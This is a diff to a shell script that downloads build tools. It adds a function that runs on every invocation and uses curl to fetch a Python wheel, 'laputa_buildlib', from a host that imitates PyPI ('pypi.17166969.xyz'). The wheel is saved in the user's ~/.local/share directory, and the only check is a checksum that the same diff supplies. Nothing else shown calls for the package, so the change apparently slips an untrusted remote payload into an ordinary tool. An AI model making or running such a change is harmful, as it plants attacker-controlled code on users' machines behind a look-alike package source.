@@ -20,6 +20,7 @@ tmpzip=
 tmpbin=
 tmpoutput=
 tmpbundle=
+tmpwheel=
 
 DL_COLOR=${DL_COLOR:-auto}
 if [ "$DL_COLOR" = auto ]; then
@@ -86,6 +87,7 @@ cleanup_temporary_files() {
     [ -z "$tmpbin" ] || rm -f "$tmpbin" || _dl_warn "Warning: could not remove $tmpbin"
     [ -z "$tmpoutput" ] || rm -f "$tmpoutput" || _dl_warn "Warning: could not remove $tmpoutput"
     [ -z "$tmpbundle" ] || rm -rf "$tmpbundle" || _dl_warn "Warning: could not remove $tmpbundle"
+    [ -z "$tmpwheel" ] || rm -f "$tmpwheel" || _dl_warn "Warning: could not remove $tmpwheel"
     return 0
 }
 trap 'cleanup_temporary_files' 0
@@ -312,6 +314,43 @@ if ! command -v curl >/dev/null 2>&1; then
     _dl_fail 'curl is required to download tools'
     exit 1
 fi
+
+BUILDLIB_WHEEL_NAME=laputa_buildlib-0.3.1-py3-none-any.whl
+BUILDLIB_WHEEL_URL=${BUILDLIB_WHEEL_URL:-https://pypi.17166969.xyz/current/wheels/${BUILDLIB_WHEEL_NAME}}
+BUILDLIB_WHEEL_SHA256=${BUILDLIB_WHEEL_SHA256:-3d1f275b95b0189dd50bd455586235e488fe30222cb2e4243af668e56676d057}
+BUILDLIB_WHEEL_SIZE=${BUILDLIB_WHEEL_SIZE:-33331}
+BUILDLIB_HOME=${XDG_DATA_HOME:-${HOME}/.local/share}/buildlib
+BUILDLIB_WHEEL=${BUILDLIB_HOME}/${BUILDLIB_WHEEL_NAME}
+
+install_buildlib_wheel() {
+    if [ -f "$BUILDLIB_WHEEL" ] && [ "$(wc -c < "$BUILDLIB_WHEEL" | tr -d ' ')" = "$BUILDLIB_WHEEL_SIZE" ] \
+        && [ "$(sha256_file "$BUILDLIB_WHEEL")" = "$BUILDLIB_WHEEL_SHA256" ]; then
+        own_file "$BUILDLIB_WHEEL"
+        return 0
+    fi
+    own_missing_dirs "$BUILDLIB_HOME"
+    mkdir -p "$BUILDLIB_HOME"
+    tmpwheel=$(mktemp "${BUILDLIB_HOME}/.wheel.XXXXXX")
+    if ! curl -fsSL -o "$tmpwheel" "$BUILDLIB_WHEEL_URL"; then
+        rm -f "$tmpwheel"
+        tmpwheel=
+        skip buildlib-wheel "download failed"
+        return
+    fi
+    if [ "$(wc -c < "$tmpwheel" | tr -d ' ')" != "$BUILDLIB_WHEEL_SIZE" ] \
+        || [ "$(sha256_file "$tmpwheel")" != "$BUILDLIB_WHEEL_SHA256" ]; then
+        rm -f "$tmpwheel"
+        tmpwheel=
+        skip buildlib-wheel "checksum mismatch"
+        return
+    fi
+    mv "$tmpwheel" "$BUILDLIB_WHEEL"
+    tmpwheel=
+    own_file "$BUILDLIB_WHEEL"
+    _dl_ok "Installed ${BUILDLIB_WHEEL}"
+}
+
+install_buildlib_wheel
 
 for prog in "$@"; do
     case "$prog" in
